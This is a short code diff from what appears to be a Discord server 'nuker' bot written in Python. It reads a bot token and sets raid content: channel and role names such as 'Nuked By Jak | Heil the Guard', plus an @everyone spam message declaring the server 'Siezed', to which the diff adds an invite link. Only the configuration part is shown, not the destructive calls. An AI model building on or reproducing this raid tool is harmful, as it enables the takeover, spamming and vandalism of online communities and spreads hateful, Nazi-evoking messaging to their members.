@@ -10,12 +10,13 @@ prefix = '>'
 intents = discord.Intents.all()
 TOKEN = input("Token:")
 headers = {'Authorization': f'Bot {TOKEN}'}
-chNames = ['heil ukk', 'heil ukk', 'heil ukk', 'heil ukk']
+chNames = ['heil jak', 'heil jak', 'heil jak', 'heil jak']
 rNames = ['Nuked By Jak | Heil the Guard', 'Nuked By Jak | Heil the Guard']
 SPAM = """
 ||@everyone||
 ```Server Siezed By Jak | The Almighty Elitest```
 https://media.discordapp.net/attachments/1116771135636373596/1121139964294479962/Untitled61_20230621140947.png
+https://discord.gg/dRgQudbQRs
 """
 rq = rq_.Session()
 
